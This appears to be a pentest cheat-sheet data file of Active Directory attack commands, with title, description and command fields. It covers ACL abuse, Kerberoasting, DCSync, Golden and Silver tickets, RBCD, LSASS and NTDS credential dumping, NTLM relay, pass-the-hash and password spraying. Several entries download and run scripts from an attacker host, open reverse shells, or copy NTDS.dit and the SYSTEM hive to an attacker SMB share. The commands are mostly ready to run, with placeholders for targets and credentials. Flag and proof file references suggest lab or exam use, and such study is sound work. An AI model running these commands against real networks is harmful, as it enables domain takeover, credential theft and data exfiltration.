commands.title: Access SYSVOL.
commands.command: smbclient //<DC_IP>/SYSVOL -U "<DOMAIN>\\<USER>%<PASS>"

commands.title: ACL Abuse - Add Group Member With Net RPC
commands.description: GenericAll on group with net rpc.
commands.command: net rpc group addmem '<GROUP>' '<USER>' -U '<DOMAIN>/<USER>%<PASS>' -S <DC_HOST>

commands.title: ACL Abuse - Add Group Member With PowerView
commands.description: Load PowerView, inspect privileged groups, add a user to the target group, and confirm membership.
commands.command:
(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1') | IEX
Get-DomainGroup "<GROUP>"
Add-DomainGroupMember -Identity "<GROUP>" -Members <USER>
Get-DomainGroupMember "<GROUP>"

commands.title: ACL Abuse - ForceChangePassword
commands.description: ForceChangePassword.
commands.command: net rpc password '<TARGET_USER>' '<NEW_PASS>' -U '<DOMAIN>/<USER>%<PASS>' -S <DC_HOST>

commands.title: ACL Abuse - Grant DCSync With Impacket
commands.description: WriteDACL on domain with Impacket.
commands.command: impacket-dacledit -action write -rights DCSync -principal '<USER>' -target-dn '<DOMAIN_DN>' '<DOMAIN>/<USER>:<PASS>'

commands.title: ACL Abuse - Grant DCSync With PowerView
commands.description: WriteDACL on domain: grant DCSync rights with PowerView.
commands.command: Add-DomainObjectAcl -TargetIdentity '<DOMAIN_DN>' -PrincipalIdentity '<USER>' -Rights DCSync

commands.title: AD Common Port Scan
commands.description: Check common AD ports.

commands.title: AD CS
commands.description: Find vulnerable AD CS templates.
commands.command:
certipy find -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip <DC_IP> -vulnerable
certipy-ad find -u <USER> -p '<PASS>' -dc-ip <DC_IP> -target <DOMAIN> -vulnerable -enabled

commands.title: AD CS ESC1 Certificate Impersonation
commands.description: Request a certificate as an admin UPN, then authenticate with the issued PFX.
commands.command:
# 1. Request a certificate impersonating the target admin.

certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn '<ADMIN>@<DOMAIN>' -dc-ip <DC_IP>
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn '<TARGET_USER>@<DOMAIN>' -dc-ip <DC_IP> -target <DC_HOST>

# 2. Authenticate with the PFX to get a TGT/hash.

certipy auth -pfx <ADMIN>.pfx -dc-ip <DC_IP>
certipy-ad auth -pfx <PFX_FILE> -dc-ip <DC_IP>

commands.title: AD CS ESC8 NTLM Relay
commands.description: ESC8: relay NTLM to AD CS.
commands.command: certipy relay -target http://<CA_HOST>/certsrv/ -template <TEMPLATE>

commands.title: AD-Focused Checks
commands.description: Run `adPEAS` from memory or from disk to collect AD-relevant findings from the current host.
commands.command:
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/adPEAS.ps1')
. .\adPEAS.ps1
Invoke-adPEAS

commands.title: AD Full Port Scan
commands.description: Run full AD-focused scan.
commands.command: nmap -Pn -sC -sV -p- <DC_IP> -oN nmap/ad-full

commands.title: ADPeas
commands.description: Run ADPeas from a domain context, save output, then search for high-signal AD attack paths.
commands.command:
# Download ADPeas to the Windows target.
certutil.exe -urlcache -f http://<LHOST>/ADPeas.ps1 ADPeas.ps1
powershell -c "iwr http://<LHOST>/ADPeas.ps1 -OutFile ADPeas.ps1"

# Import and run ADPeas.
powershell -ep bypass
Import-Module .\ADPeas.ps1
Invoke-ADPeas

# Save output for review.
Invoke-ADPeas | Tee-Object -FilePath adpeas.out
Invoke-ADPeas | Out-File adpeas.out

# Search high-signal AD findings.
Select-String -Path .\adpeas.out -Pattern "Kerberoast|ASREPRoast|Delegation|Unconstrained|Constrained|RBCD|AdminCount|GenericAll|GenericWrite|WriteDacl|WriteOwner|AddMember|ForceChangePassword|LAPS|GMSA|Password|Credential|Domain Admin|Enterprise Admin|Local Admin|SPN|ACL|DCSync" -CaseSensitive:$false

commands.title: ASREPRoast
commands.description: Request ASREP hashes for users without pre-auth, then crack them.
commands.command:
# Option 1: users file.
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -no-pass -dc-ip <DC_IP> -outputfile asrep.hashes

# Option 2: single known user.
impacket-GetNPUsers <DOMAIN>/<USER> -request -no-pass -dc-ip <DC_IP> -outputfile asrep.hashes

# Crack ASREP hash.
hashcat -m 18200 asrep.hashes <WORDLIST>

commands.title: ASREPRoast with NetExec.
commands.command: nxc ldap <DC_IP> -u <USER> -p '<PASS>' --asreproast output.txt

commands.title: ASREPRoast with user list.
commands.command: impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -outputfile output.txt

commands.title: Bad-ODF NTLM Capture
commands.description: Generate a malicious ODF document, upload it to a place the victim opens, capture NetNTLMv2, then crack it.
commands.command:
# Attacker: generate an ODF payload with Bad-ODF.
# Reference: https://github.com/lof1sec/Bad-ODF

# Attacker: listen for NTLM authentication.
sudo responder -I <IFACE> -v

# After capture, save the NetNTLMv2 hash into hash.txt and crack it.
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show --format=netntlmv2 hash.txt

commands.title: BloodHound Collection
commands.description: Collect BloodHound data with NetExec or `bloodhound-python`, then launch the GUI.
commands.command:
# Option 1: NetExec collection.
nxc ldap <DC_IP> -u <USER> -p '<PASS>' -d <DOMAIN> --dns-server <DC_IP> --bloodhound --collection All

# Option 1b: NetExec collection with an NTLM hash.
nxc ldap <DC_IP> -u <USER> -H <NTLM_HASH> -d <DOMAIN> --dns-server <DC_IP> --bloodhound --collection All

# Option 2: bloodhound-python collection.
bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -v --zip -c All,LoggedOn -dc <DC_HOST> -ns <DC_IP>

# Use DNS over TCP when UDP DNS is blocked or unreliable.
bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -v --zip -c All -dc <DC_HOST> -ns <DC_IP> --dns-tcp

# Start the BloodHound GUI with Electron sandboxing disabled if needed.
./BloodHound --no-sandbox --disable-gpu

commands.title: Check password policy.
commands.description: Check password policy.
commands.command: nxc smb <DC_IP> -u <USER> -p '<PASS>' --pass-pol

commands.title: Constrained Delegation
commands.description: Constrained delegation: impersonate DA to CIFS.
commands.command: impacket-getST -spn cifs/<TARGET_HOST> -impersonate <DA_USER> <DOMAIN>/<USER> -hashes :<NTLM_HASH>

commands.title: Credential Dumping After Local Admin
commands.description: Dump local secrets remotely after confirming local admin access.
commands.command:
# Full secretsdump with plaintext credentials.
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<TARGET_IP>

# Full secretsdump with NTLM hash.
impacket-secretsdump <USER>@<TARGET_IP> -hashes :<NTLM_HASH>

# LSASS dump with lsassy.
lsassy -d <DOMAIN> -u <USER> -p '<PASS>' <TARGET_IP>

# SAM dump with NetExec.
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --sam

# NetExec credential dumping modules.
nxc smb <TARGET_SUBNET> -u <USER> -p '<PASS>' -M lsassy
nxc smb <TARGET_SUBNET> -u <USER> -p '<PASS>' -M nanodump

commands.title: DC Discovery With Dig
commands.description: Find domain controllers via DNS SRV.
commands.command: dig SRV _ldap._tcp.dc._msdcs.<DOMAIN> @<DNS_IP>

commands.title: DC Discovery With Nslookup
commands.description: Find domain controllers with nslookup.
commands.command:
nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>
nslookup -type=SRV _ldap._tcp.pdc._msdcs.<DOMAIN> <DNS_IP>

commands.title: DCOM MMC20 Execution
commands.description: Use the MMC20 DCOM object for remote command execution when you have the needed privileges.
commands.command:
# Attacker: catch the callback.
nc -lvnp <LPORT>

# Target PowerShell: create a remote MMC20 object and execute a payload.
powershell -ep bypass
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1", "<TARGET_IP>"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell", $null, "-e <BASE64_PAYLOAD>", "7")

commands.title: DCSync
commands.description: Dump domain hashes with DCSync using Impacket, Mimikatz, or NetExec.
commands.command:
# Impacket: dump all domain hashes.
impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASS>@<DC_IP>

# Impacket: dump one user.
impacket-secretsdump -just-dc-user <TARGET_USER> <DOMAIN>/<USER>:<PASS>@<DC_IP>

# Mimikatz from a Windows shell.
mimikatz.exe "lsadump::dcsync /domain:<DOMAIN> /user:<TARGET_USER>"

# NetExec with password.
nxc smb <DC_IP> -u <USER> -p '<PASS>' --ntds

# NetExec with NTLM hash.
nxc smb <DC_IP> -u <USER> -H <NTLM_HASH> --ntds

commands.title: Enumerate groups.
commands.command: nxc ldap <DC_IP> -u <USER> -p '<PASS>' --groups

commands.title: Enumerate groups.
commands.command: nxc smb <DC_IP> -u <USER> -p '<PASS>' --groups

commands.title: Enumerate local groups.
commands.command: rpcclient -U "<USER>%<PASS>" <DC_IP> -c "enumalsgroups domain"

commands.title: Enumerate users.
commands.command: nxc ldap <DC_IP> -u <USER> -p '<PASS>' --users

commands.title: Enumerate users.
commands.command: nxc smb <DC_IP> -u <USER> -p '<PASS>' --users

commands.title: Golden Ticket
commands.description: Dump the `krbtgt` hash, forge a Golden Ticket, and use it for domain persistence.
commands.command:
# Attacker: find the domain SID.
impacket-lookupsid '<DOMAIN>/<USER>:<PASS>'@<DC_IP>

# Attacker: dump only krbtgt with DCSync rights.
impacket-secretsdump -just-dc-user krbtgt '<DOMAIN>/<USER>:<PASS>'@<DC_IP>

# Target Windows shell: inject the forged ticket with Mimikatz.
mimikatz.exe
privilege::debug
kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM_HASH> /ptt
misc::cmd

# New CMD: access a target using the injected ticket.
klist
PsExec.exe \\<DC_HOST> cmd
type C:\Users\Administrator\Desktop\flag.txt

commands.title: Kerberoast
commands.description: Kerberoast with Impacket or NetExec, then crack the TGS hash.
commands.command:
# Option 1: Impacket.
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile tgs.hashes

# Option 2: NetExec.
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --kerberoasting tgs.hashes

# Crack the captured TGS hash.
hashcat -m 13100 tgs.hashes <WORDLIST>

commands.title: Kerberoast with Impacket.
commands.command: impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -outputfile output.txt

commands.title: Kerberoast with NetExec.
commands.command: nxc ldap <DC_IP> -u <USER> -p '<PASS>' --kerberoasting output.txt

commands.title: Kerbrute Password Attacks
commands.description: Use Kerbrute for Kerberos password spray or a single-user brute force after checking lockout risk.
commands.command:
# Password spray one password across many users.
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt '<PASS>'

# Brute force one user with a wordlist.
kerbrute bruteuser -d <DOMAIN> --dc <DC_IP> <WORDLIST> <USER>

commands.title: LAPS Query
commands.description: Query LAPS-managed local admin passwords when your rights allow reading `ms-Mcs-AdmPwd`.
commands.command:
# Sync time before Kerberos/LDAP-heavy checks when clocks drift.
sudo ntpdate <DC_IP>

# Windows target: check whether LAPS is installed.
dir "C:\Program Files\LAPS"
# Example output:
# AdmPwd.UI.exe
# AdmPwd.Utils.dll

# NetExec LAPS query.
nxc ldap <DC_IP> -u <USER> -p '<PASS>' -d <DOMAIN> --laps

# LDAP query for readable LAPS passwords.
ldapsearch -x -H ldap://<DC_IP> \
  -D '<DOMAIN>\<USER>' -w '<PASS>' \
  -b '<DOMAIN_DN>' \
  '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd
# Example output:
# ms-Mcs-AdmPwd: <LAPS_PASS>

# Query one computer object directly.
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASS>' get object '<COMPUTER_NAME>$' --attr ms-Mcs-AdmPwd

# Validate the recovered local admin password.
nxc ldap <DC_IP> -d <DOMAIN> -u <LAPS_LOCAL_ADMIN> -p '<LAPS_PASS>' --kdcHost <DC_IP>
# Example output:
# [+] <DOMAIN>\<LAPS_LOCAL_ADMIN>:<LAPS_PASS>

commands.title: LDAP Enum With NetExec
commands.description: Enumerate users and groups over LDAP.
commands.command:
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --users
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --groups

# Save LDAP users and append clean usernames to users.txt.
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --users > real_users.txt
awk '{print $5}' real_users.txt | grep -E '^[A-Za-z][A-Za-z.]+$' | tr '[:upper:]' '[:lower:]' | sort -u | grep -vxFf users.txt >> users.txt

commands.title: LDAP RootDSE
commands.description: Pull RootDSE naming context without creds.
commands.command: ldapsearch -x -H ldap://<DC_IP> -s base namingcontexts

commands.title: LDAP Search With Credentials
commands.description: Query LDAP directly when NetExec output is too broad or you need a specific OU/filter.
commands.command:
# Enumerate groups inside a specific OU.
ldapsearch -x -H ldap://<DC_IP> \
  -D "<USER>@<DOMAIN>" -w '<PASS>' \
  -b "OU=<OU_NAME>,DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>" \
  "(objectClass=group)" cn

commands.title: List shares with credentials.
commands.command: nxc smb <DC_IP> -u <USER> -p '<PASS>' --shares

commands.title: List shares with null session.
commands.command: nxc smb <DC_IP> -u '' -p '' --shares

commands.title: LSASS Dump With Mimikatz
commands.description: Dump logon credentials with Mimikatz on DC.
commands.command: mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

commands.title: LSASS Minidump Offline Parse
commands.description: Dump LSASS for offline parsing, then parse the minidump on the attacker box.
commands.command:
# 1. Dump LSASS on the target.

procdump.exe -ma lsass.exe lsass.dmp

# 2. Parse the minidump offline.

pypykatz lsa minidump lsass.dmp

commands.title: MSSQL Local-Only Silver Ticket Chain
commands.description: When MSSQL is reachable only locally and the SQL service account credential is known, tunnel local SQL, forge a MSSQL Silver Ticket, enable `xp_cmdshell`, and abuse `SeImpersonatePrivilege`.
commands.command:
# 1. On the Windows target, confirm SQL listens locally and collect domain/SPN details.

netstat -ano | Select-String "1433"
Get-ADDomain
Get-ADUser -Filter {SamAccountName -eq "<SQL_SERVICE_USER>"} -Properties UserPrincipalName
Get-ADUser -Filter {SamAccountName -eq "<SQL_SERVICE_USER>"} -Properties ServicePrincipalNames

# 2. Start reverse Chisel and forward target-local MSSQL back to the attacker box.

# Attacker.
chisel server --socks5 --reverse -p <CHISEL_PORT>

# Target.
upload chisel.exe
.\chisel.exe client <LHOST>:<CHISEL_PORT> R:1433:127.0.0.1:1433

# 3. Configure local resolution/proxy and verify MSSQL.

echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf
sudo sh -c 'echo "127.0.0.1 <MSSQL_HOST_FQDN>" >> /etc/hosts'
nmap -p1433 127.0.0.1
impacket-mssqlclient <SQL_SERVICE_USER>:<SQL_SERVICE_PASS>@127.0.0.1 -windows-auth

# 4. Forge and export the MSSQL Silver Ticket.

echo -n '<SQL_SERVICE_PASS>' | iconv -t UTF-16LE | openssl md4
impacket-ticketer -nthash <SQL_SERVICE_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn MSSQL/<MSSQL_HOST_FQDN> -user-id 500 Administrator
export KRB5CCNAME=$PWD/Administrator.ccache

# 5. Use the ticket, enable command execution, upload SigmaPotato, and trigger SYSTEM execution.

impacket-mssqlclient -k <MSSQL_HOST_FQDN>

enable_xp_cmdshell
xp_cmdshell "whoami /priv"
xp_cmdshell "certutil.exe -urlcache -split -f http://<LHOST>/SigmaPotato.exe C:\Temp\SigmaPotato.exe"
xp_cmdshell "C:\Temp\SigmaPotato.exe whoami"
xp_cmdshell "C:\Temp\SigmaPotato.exe --revshell <LHOST> <LPORT>"

commands.title: MSSQL Login Impersonation Credential Loot
commands.description: Use a low-privileged MSSQL login, check impersonation rights, switch context, and loot application credentials from accessible databases.

commands.title: MSSQL xp_cmdshell
commands.description: Use MSSQL admin access to enable `xp_cmdshell`, run commands, and execute a payload.

commands.title: NTDS Hash Spray
commands.description: Extract NTLM hashes from offline `secretsdump` output, try cracking, then carefully test pass-the-hash when cracking does not work.
commands.command:
# Dump hashes from copied NTDS.DIT and SYSTEM files.
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | tee allhashes.txt

# Keep user:NTLM pairs and remove obvious disabled/machine accounts.
grep ':::' allhashes.txt | grep -viE '^(guest|krbtgt|.*\$):' | awk -F: '{print $1 ":" $4}' | sort -u > hashes_crack.txt

# Try cracking with username-aware input.
hashcat -m 1000 --username hashes_crack.txt <WORDLIST> -r /usr/share/hashcat/rules/best66.rule

# If cracking fails, test collected NTLM hashes carefully.
while IFS=: read -r u h; do
  nxc smb <TARGET_IP> -u "$u" -H "$h" --continue-on-success
done < hashes_crack.txt

commands.title: NTDS IFM Backup
commands.description: Create an IFM backup on the DC for offline NTDS extraction.
commands.command:
:: Target/DC: create IFM backup.
ntdsutil "activate instance ntds" "ifm" "create full C:\temp" quit quit

:: Attacker: extract hashes from the copied IFM files.
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

commands.title: NTDS NetExec Dump
commands.description: Dump only enabled accounts or use the VSS method with NetExec.
commands.command:
nxc smb <DC_IP> -u <USER> -p '<PASS>' --ntds --enabled
nxc smb <DC_IP> -u <USER> -p '<PASS>' --ntds vss

commands.title: NTDS NetExec Log Filtering
commands.description: Filter enabled NTDS entries from NetExec output logs.
commands.command:
grep -iv disabled ~/.nxc/logs/ntds/<DC_NAME>.ntds
grep -iv disabled ~/.nxc/logs/ntds/<DC_NAME>.ntds | cut -d ':' -f1

commands.title: NTDS Secretsdump VSS
commands.description: Dump NTDS offline or use remote VSS when DCSync is not available but admin access exists.
commands.command:
# Offline from copied NTDS.DIT and SYSTEM files.
impacket-secretsdump -ntds NTDS.DIT -system SYSTEM LOCAL

# Remote VSS with domain admin or equivalent rights.
impacket-secretsdump -just-dc '<DOMAIN>/<USER>:<PASS>'@<DC_IP> -use-vss

commands.title: NTDS Shadow Copy Exfil
commands.description: Create a shadow copy, copy `NTDS.dit` and `SYSTEM`, then exfiltrate them over SMB.
commands.command:
:: Target/DC: create a shadow copy.
vssadmin create shadow /for=C: /autoretry=2

:: Target/DC: if vssadmin is blocked, try vshadow.
vshadow.exe -nw -p C:

:: Target/DC: copy NTDS and SYSTEM from the discovered shadow copy path.
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<NUM>\Windows\NTDS\ntds.dit C:\NTDS.DIT
reg.exe save HKLM\SYSTEM C:\SYSTEM

:: Attacker: expose an SMB share.
impacket-smbserver share . -username <USER> -password <PASS> -smb2support

:: Target/DC: mount the attacker share and copy files out.
net use \\<LHOST>\share /user:<USER> <PASS>
copy C:\NTDS.DIT \\<LHOST>\share\
copy C:\SYSTEM \\<LHOST>\share\

commands.title: NTLM Relay With SMB Signing Disabled
commands.description: Relay captured Net-NTLMv2 when SMB signing is disabled.
commands.command:
# Check signing on candidate targets.
nxc smb <TARGET_SUBNET>
nxc smb <TARGET_SUBNET> --gen-relay-list targets.txt

# Relay to targets from a file.
impacket-ntlmrelayx -tf targets.txt -smb2support

# Relay to a target and execute a payload.
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c "powershell -e <BASE64_PAYLOAD>"

# Trigger authentication from a victim.
dir \\<LHOST>\test

commands.title: Null Session To SYSVOL
commands.description: Check anonymous SMB access, browse SYSVOL if allowed, and decrypt old GPP passwords if found.
commands.command:
# Check null session shares.
nxc smb <DC_IP> -u '' -p '' --shares

# Access SYSVOL anonymously if allowed.
smbclient //<DC_IP>/SYSVOL -N

# Decrypt old GPP cpassword values found in SYSVOL XML files.
gpp-decrypt <CPASSWORD>

commands.title: Overpass The Hash With Mimikatz
commands.description: Use Mimikatz overpass-the-hash to spawn a Kerberos-capable PowerShell session, then reach another host.
commands.command:
# Target Windows shell: create a new logon session from an NTLM hash.
mimikatz.exe
privilege::debug
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell

# New PowerShell/CMD: force Kerberos use and confirm tickets.
klist
net use \\<TARGET_HOST>\IPC$
klist

# Move laterally if the user has rights.
cd C:\Tools\SysInternalSuite
.\PsExec.exe \\<TARGET_HOST> cmd

commands.title: Pass The Hash
commands.description: Test an NTLM hash, then use SMB/WMI execution if the account has admin rights.
commands.command:
# Check whether the hash is valid and has admin rights.
nxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH>

# Interactive SMB service execution.
impacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>

# WMI command shell.
impacket-wmiexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>

commands.title: Pass The Key With Impacket
commands.description: Get a TGT with an NTLM hash, then use the ticket with Kerberos-aware tools.
commands.command:
# Request a TGT from an NTLM hash.
impacket-getTGT <DOMAIN>/<USER> -hashes :<NTLM_HASH>

# Point Impacket tools at the generated Kerberos cache.
export KRB5CCNAME=<USER>.ccache

# Use Kerberos auth for remote execution.
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_HOST>

commands.title: Pass The Ticket
commands.description: Export Kerberos tickets with Mimikatz, inject the useful CIFS ticket, and access the target share.
commands.command:
# Target Windows shell: export available tickets.
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
exit

# Target Windows shell: find the CIFS ticket for the target host.
dir *.kirbi

# Target Windows shell: inject the ticket and confirm access.
mimikatz.exe
privilege::debug
kerberos::ptt <TICKET_FILE>.kirbi
exit
klist
dir \\<TARGET_HOST>\backup

commands.title: Password Spray
commands.description: Check password policy, then spray one password across a user list.
commands.command:
# Check password policy first.
nxc smb <DC_IP> -u <USER> -p '<PASS>' --pass-pol

# Spray only after confirming lockout risk.
nxc smb <DC_IP> -u users.txt -p '<PASSWORD>' --continue-on-success

commands.title: Password Spray Across Protocols
commands.description: Spray one credential across common internal protocols and keep going after the first success.
commands.command:
for proto in smb winrm ldap mssql ssh rdp; do
  echo "[*] === $proto ==="
  nxc $proto <TARGET_SUBNET> -u <USER> -p '<PASS>' --continue-on-success --no-bruteforce
  echo
done

commands.title: PowerView
commands.description: Load PowerView directly into memory and run quick domain checks.
commands.command:
(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1') | IEX

Get-DomainController
Get-DomainController | Select-Object Name
Find-LocalAdminAccess
Get-DomainGroup -Name "Domain Admins"
Get-DomainUser
Get-DomainGroup
Get-DomainComputer | Select-Object dnshostname,operatingsystem
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainUser | Where-Object {$_.description} | Select-Object samaccountname,description
Find-DomainShare -CheckShareAccess
Get-DomainGPO
Get-DomainTrust
Get-DomainUser -SPN
Get-DomainUser -PreauthNotRequired

commands.title: Query a specific user by RID.
commands.command: rpcclient -U "<USER>%<PASS>" <DC_IP> -c "queryuser 0x1f4"

commands.title: RBCD
commands.description: Create a fake computer, grant it delegation to the target, then request a service ticket.
commands.command:
# 1. Add a fake computer account.

impacket-addcomputer <DOMAIN>/<USER>:<PASS> -computer-name '<FAKE_COMPUTER>$' -computer-pass '<FAKE_PASS>' -dc-ip <DC_IP>

# 2. Set resource-based constrained delegation to the target computer.

impacket-rbcd -delegate-from '<FAKE_COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -dc-ip <DC_IP> -action write <DOMAIN>/<USER>:<PASS>

# 3. Request a CIFS ticket while impersonating the target admin.

impacket-getST -spn cifs/<TARGET_HOST> -impersonate <DA_USER> <DOMAIN>/<FAKE_COMPUTER>$:<FAKE_PASS> -dc-ip <DC_IP>

commands.title: RBCD With NTLM Hash
commands.description: Use GenericAll/GenericWrite on a computer object to add a fake computer, configure RBCD, request a CIFS ticket, and execute with Kerberos.
commands.command:
# 1. Collect BloodHound context with a hash.

nxc ldap <DC_IP> -u <USER> -H <NTLM_HASH> -d <DOMAIN> --dns-server <DC_IP> --bloodhound --collection All

# 2. Add a fake computer account with hash auth.

impacket-addcomputer <DOMAIN>/<USER> -dc-ip <DC_IP> -hashes :<NTLM_HASH> -computer-name '<FAKE_COMPUTER>$' -computer-pass '<FAKE_PASS>'

# 3. Grant RBCD from the fake computer to the target computer.

wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py
python3 rbcd.py -dc-ip <DC_IP> -t <TARGET_COMPUTER> -f <FAKE_COMPUTER> -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'

# 4. Request and use a CIFS ticket as the target admin.

impacket-getST -spn cifs/<TARGET_FQDN> <DOMAIN>/<FAKE_COMPUTER>$:'<FAKE_PASS>' -impersonate <ADMIN_USER> -dc-ip <DC_IP>
export KRB5CCNAME=$PWD/<TICKET>.ccache
sudo sh -c 'echo "<DC_IP> <TARGET_FQDN>" >> /etc/hosts'
sudo impacket-psexec -k -no-pass <TARGET_FQDN> -dc-ip <DC_IP>
whoami

commands.title: RDP
commands.description: Check RDP access, and enable RDP through SMB only when you already have admin rights.
commands.command:
# Check whether RDP is enabled and the credential is accepted.
nxc rdp <TARGET_IP> -u <USER> -p '<PASS>'

# Enable RDP through SMB admin rights if needed.
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M rdp -o ACTION=enable

commands.title: Remote LSASS Dump With Lsassy
commands.description: Remote LSASS dump with lsassy.
commands.command: lsassy -d <DOMAIN> -u <USER> -p '<PASS>' <DC_IP>

commands.title: Responder Net-NTLMv2 Capture
commands.description: Capture Net-NTLMv2 with Responder and a coerced UNC path.
commands.command:
# Kali
sudo responder -I <IFACE> -v
sudo responder -I <IFACE> -wdF
sudo responder -I <IFACE> -wdF -P

# Victim shell or injected input
dir \\<LHOST>\test

# Review captured hashes.
cat /usr/share/responder/logs/*.txt

# Crack captured NTLMv2.
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

commands.title: Rubeus Kerberos Checks
commands.description: Use Rubeus from a Windows domain shell for roastable users, tickets, and pass-the-ticket workflows.
commands.command:
# AS-REP roast and Kerberoast from a domain context.
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
Rubeus.exe kerberoast /outfile:kerb.txt /format:hashcat

# Request and inject a TGT with an NTLM hash.
Rubeus.exe asktgt /user:<USER> /rc4:<NTLM_HASH> /ptt

# Inject or inspect tickets.
Rubeus.exe ptt /ticket:<TICKET>.kirbi
Rubeus.exe dump /nowrap
Rubeus.exe monitor /interval:5 /nowrap

commands.title: SAM + SYSTEM
commands.description: Save SAM/SYSTEM hives and extract local hashes offline.
commands.command:
:: Target: save hives.
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

:: Attacker: extract local hashes offline.
impacket-secretsdump -sam sam.save -system system.save LOCAL

commands.title: Shadow Credentials
commands.description: Add shadow credentials to a target account, then authenticate with the generated PFX.
commands.command:
# 1. Add a shadow credential to the target account.

certipy shadow add -u '<USER>@<DOMAIN>' -p '<PASS>' -account '<TARGET_USER>' -dc-ip <DC_IP>

# 2. Authenticate using the shadow credential PFX.

certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>

commands.title: SharpHound Collection
commands.description: Collect BloodHound data from a Windows domain shell when Python collection is unreliable.
commands.command:
# Run SharpHound executable collector.
.\SharpHound.exe -c All --zipfilename loot.zip
.\SharpHound.exe -c All,GPOLocalGroup --zipfilename loot.zip
.\SharpHound.exe -c All --stealth

# PowerShell collector.
Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip

commands.title: Silver Tickets
commands.description: Forge and inject a Silver Ticket with a service account NTLM hash.
commands.command:
# Attacker: get the domain SID.
impacket-lookupsid '<DOMAIN>/<USER>:<PASS>'@<DC_IP> | findstr /i "Domain SID"

# Attacker: dump or identify the target service account hash.
impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>

# Target Windows shell: verify current access, then inject the ticket.
powershell -ep bypass
iwr -UseDefaultCredentials http://<TARGET_WEB>
klist
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "kerberos::golden /sid:<DOMAIN_SID> /domain:<DOMAIN> /ptt /target:<TARGET_HOST> /service:http /rc4:<SERVICE_NTLM_HASH> /user:<USER>"
iwr -UseDefaultCredentials http://<TARGET_WEB>

commands.title: SMB Enum With NetExec
commands.description: Enumerate users, groups, and shares over SMB.
commands.command:
nxc smb <DC_IP> -u <USER> -p '<PASS>' --users
nxc smb <DC_IP> -u <USER> -p '<PASS>' --groups
nxc smb <DC_IP> -u <USER> -p '<PASS>' --shares

# Useful NetExec modules after valid creds.
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M gpp_password
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M spider_plus

commands.title: SMB Remote Execution
commands.description: Use psexec or NetExec for command execution after confirming admin rights.
commands.command:
# Interactive psexec shell.
impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>

# One-off command execution.
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -x "cmd /c \"whoami && hostname && ipconfig /all\""
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -x "cmd /c \"type C:\Users\Administrator\Desktop\proof.txt && ipconfig /all && whoami\""

commands.title: SMB/RPC User Enum
commands.description: Try anonymous RPC user enum.
commands.command: rpcclient -U '' -N <DC_IP> -c 'enumdomusers'

commands.title: Subnet Reuse With NTLM Hash
commands.description: Sweep a subnet with an NTLM hash and test domain or local auth.
commands.command:
# Test domain auth with the NTLM hash.
nxc smb <TARGET_SUBNET> -u <USER> -H <NTLM_HASH>

# Test local account hash reuse across the subnet.
nxc smb <TARGET_SUBNET> -u <USER> -H <NTLM_HASH> --local-auth

commands.title: Subnet Reuse With Password
commands.description: Sweep a subnet with plaintext credentials and test domain or local auth.
commands.command:
# Test domain auth across the subnet.
